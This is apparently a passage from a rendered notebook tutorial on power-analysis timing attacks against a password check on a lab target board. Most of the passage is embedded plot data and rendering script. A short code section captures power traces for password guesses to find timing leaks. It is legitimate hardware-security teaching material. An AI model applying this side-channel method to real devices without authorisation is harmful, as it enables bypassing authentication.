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","dtype":"float64","shape":[800]}},"selected":{"id":"1045","type":"Selection"},"selection_policy":{"id":"1046","type":"UnionRenderers"}},"id":"1034","type":"ColumnDataSource"},{"attributes":{},"id":"1024","type":"SaveTool"}],"root_ids":["1002"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"dd7463e3-a0f9-4226-99c2-6be12b61ffc5","roots":{"1002":"d0e39399-0414-4a6b-9e59-33120d0157ea"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

Timing Analysis
---------------

Now that we can capture traces, we can begin planning our attack. First
we'll make a function to guess a password and return a power trace,
since we'll be repeating those steps a lot:


**In [13]:**

.. code:: ipython3

    def cap_pass_trace(pass_guess):
        ret = ""
        reset_target(scope)
        num_char = target.in_waiting()
        while num_char > 0:
            ret += target.read(num_char, 10)
            time.sleep(0.01)
            num_char = target.in_waiting()
    
        scope.arm()
        target.write(pass_guess)
        ret = scope.capture()
        if ret:
            print('Timeout happened during acquisition')
    
        trace = scope.get_last_trace()
        return trace

Next, we'll try two different passwords and see if the power traces
differ by length. We'll then plot both traces on the same figure (with
the first in red and the second in blue).


**In [14]:**

.. code:: ipython3

    trace = cap_pass_trace("\n")
    new_trace = cap_pass_trace("h\n")
    x_range = range(0, len(new_trace))
    p = figure()
    p.add_tools(CrosshairTool())
    p.line(x_range, new_trace)
    p.line(x_range, trace, line_color='red')
    show(p)


**Out [14]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    



.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="e8844ecf-6d85-4abe-8be8-28ed2fb2c286" data-root-id="1102"></div>
    
    </div>



.. raw:: html

    

    <div id="e60b7298-b9a3-4d94-adc5-ef4305345efc"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#e60b7298-b9a3-4d94-adc5-ef4305345efc');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"a29729c2-c242-4765-acaa-bde78ff91155":{"roots":{"references":[{"attributes":{"below":[{"id":"1111","type":"LinearAxis"}],"center":[{"id":"1115","type":"Grid"},{"id":"1120","type":"Grid"}],"left":[{"id":"1116","type":"LinearAxis"}],"renderers":[{"id":"1139","type":"GlyphRenderer"},{"id":"1144","type":"GlyphRenderer"}],"title":{"id":"1155","type":"Title"},"toolbar":{"id":"1127","type":"Toolbar"},"x_range":{"id":"1103","type":"DataRange1d"},"x_scale":{"id":"1107","type":"LinearScale"},"y_range":{"id":"1105","type":"DataRange1d"},"y_scale":{"id":"1109","type":"LinearScale"}},"id":"1102","subtype":"Figure","type":"Plot"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1121","type":"PanTool"},{"id":"1122","type":"WheelZoomTool"},{"id":"1123","type":"BoxZoomTool"},{"id":"1124","type":"SaveTool"},{"id":"1125","type":"ResetTool"},{"id":"1126","type":"HelpTool"},{"id":"1134","type":"CrosshairTool"}]},"id":"1127","type":"Toolbar"},{"attributes":{},"id":"1125","type":"ResetTool"},{"attributes":{},"id":"1124","type":"SaveTool"},{"attributes":{"overlay":{"id":"1165","type":"BoxAnnotation"}},"id":"1123","type":"BoxZoomTool"},{"attributes":{},"id":"1122","type":"WheelZoomTool"},{"attributes":{},"id":"1134","type":"CrosshairTool"},{"attributes":{},"id":"1121","type":"PanTool"},{"attributes":{"source":{"id":"1136","type":"ColumnDataSource"}},"id":"1140","type":"CDSView"},{"attributes":{"dimension":1,"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1120","type":"Grid"},{"attributes":{},"id":"1126","type":"HelpTool"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1137","type":"Line"},{"attributes":{"formatter":{"id":"1157","type":"BasicTickFormatter"},"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1116","type":"LinearAxis"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1138","type":"Line"},{"attributes":{"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1115","type":"Grid"},{"attributes":{"data_source":{"id":"1136","type":"ColumnDataSource"},"glyph":{"id":"1137","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1138","type":"Line"},"selection_glyph":null,"view":{"id":"1140","type":"CDSView"}},"id":"1139","type":"GlyphRenderer"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799],"y":{"__ndarray__":"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